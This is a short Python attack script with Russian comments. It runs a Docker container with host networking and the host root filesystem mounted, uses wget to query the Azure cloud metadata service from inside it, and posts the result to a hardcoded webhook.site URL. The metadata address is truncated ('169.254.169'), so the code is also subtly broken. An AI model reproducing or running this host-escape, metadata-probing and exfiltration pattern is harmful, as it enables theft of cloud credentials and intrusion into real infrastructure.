import subprocess
import requests

WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"

def run_host_command(cmd_args):
    base_cmd = ["docker", "run", "--rm", "--net=host", "-v", "/:/mnt/host", "alpine", "sh", "-c"]
    full_cmd = base_cmd + [cmd_args]
    try:
        return subprocess.check_output(full_cmd, stderr=subprocess.STDOUT).decode(errors='ignore')
    except subprocess.CalledProcessError as e:
        return f"ERROR (Exit Code {e.returncode}): {e.output.decode(errors='ignore')}"

def final_test():
    payload = {
        "experiment_status": "FINAL_TEST",
        "azure_imds_result": ""
    }

    print("[*] Финальный тест: отправка запроса к Azure IMDS через wget...")
    # --header='Metadata: true' — обязательный заголовок для Azure
    # -T 5 — таймаут в 5 секунд, чтобы скрипт не завис, если сеть дропает пакеты
    # -O - — выводить ответ прямо в консоль/переменную
    wget_cmd = "wget -T 5 --header='Metadata: true' http://169.254.169 -O -"
    
    payload["azure_imds_result"] = run_host_command(wget_cmd)

    # Отправляем финальный отчет
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print("[+] Финальный отчет отправлен на Webhook.site!")
    except Exception as e:
        print(f"[-] Ошибка отправки: {e}")

if __name__ == "__main__":
    final_test()
